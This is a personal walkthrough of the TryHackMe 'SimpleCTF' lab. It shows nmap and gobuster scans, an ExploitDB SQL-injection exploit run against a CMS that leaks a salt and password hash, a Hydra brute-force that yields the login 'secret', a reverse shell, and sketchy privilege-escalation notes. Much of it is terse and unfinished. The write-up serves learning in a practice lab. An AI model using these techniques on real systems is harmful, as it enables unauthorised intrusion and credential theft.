## TryHackMe - SimpleCTF
> Completed 28th June  2022.

This box ended up being an interesting less than straight forward boot2root exercise. I found myself stuggling again once I needed to explore for priviledge escallation vectors.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Gobuster
- Hydra
- ExploitDB
- Metasploit / Netcat listener

---
### Methodology
#### Objectives/Flags
1. user flag
2. root flag

---
#### Reconnaissance
Started off by scanning the target for open ports and services.
```bash
nmap -T4 -Pn -sV <TargetIP>
```
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
This reavealed a web server that we can enumerate and an ssh service running on a custom port of `2222`. When navigating to the URL of the webserver we a met with a default Apache page which could hint at unconventional file structure. I loaded up `Gobuster` and got it to work scanning for directories. The wordlist used was `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/).
```bash
gobuster dir --url http://<TargetIP>/ -w <Wordlist> > <Outputfile>
```
```
//simple              (Status: 301) [Size: 313] [--> http://<TargetIP>/simple/]
```
Once we navigate to the `simple` directory, we are met with a webpage that appears be built using a CMS framework. From here set `Gobuster` up to scan the new directory as I started walking through the page-source and hyperlinks and discover an admin login portal.
```bash
gobuster dir --url http://<TargetIP>/simple -w <Wordlist> > <Outputfile>
```
```
//uploads             (Status: 301) [Size: 319] [--> http://10.10.7.140/simple/uploads/]
//admin               (Status: 301) [Size: 317] [--> http://10.10.7.140/simple/admin/]    
```

found robots.txt and revealed user `mitch`

searched up CMS framework on ExploitDB and find exploit to run
exploit required python syntax fixing. This exploit looks to use blin
```bash
python 46635.py -u http://<TargetIP>/simple/
```
```
[+] Salt for password found: 1dac0d92e9fa6bb2.
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
The exploit confirms user `mitch` is present on the target and reveals to us an admin email address. Unfortunately the exploit fails to crack the password, the error indicates to me that it might be another syntax issue but as it's beyond my  knowledge, I couldn't remediate it.


Hydra mitch
[80][http-post-form] host: 10.10.194.228   login: mitch   password: secret

find admin file upload
set up listener
run payload

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exploit DB 46635
fix up syntax
python 46635.py -u http://10.10.78.164/simple/
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
[*] Now try to crack password
Traceback (most recent call last):
  File "/home/kali/kali-tools/TryHackMe/SimpleCTF/46635.py", line 184, in <module>
    crack_password()
  File "/home/kali/kali-tools/TryHackMe/SimpleCTF/46635.py", line 53, in crack_password
    for line in dict.readlines():
  File "/usr/lib/python3.9/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
```

ssh into mitch
user.txt
sudo -l
vim exploit
root.txt

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
N/A

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
N/A

---
### After-action
#### What I've learned
N/A

#### What I would've done differently
N/A

> Edit: N/A
